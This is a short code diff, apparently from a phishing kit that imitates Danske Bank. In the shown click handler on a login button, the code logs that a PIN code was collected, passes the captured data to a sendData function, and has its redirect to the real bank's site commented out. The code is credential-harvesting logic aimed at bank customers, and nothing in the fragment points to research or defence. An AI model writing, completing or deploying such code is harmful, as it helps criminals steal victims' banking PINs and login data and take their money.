@@ -65,6 +65,6 @@ loginBtn.addEventListener("click", (e) => {
         console.log("PIN-code collected");
         console.log(data, JSON.stringify(data));
         sendData(data);
-        location.href = "https://danskebank.dk";
+        // location.href = "https://danskebank.dk";
     }
 });
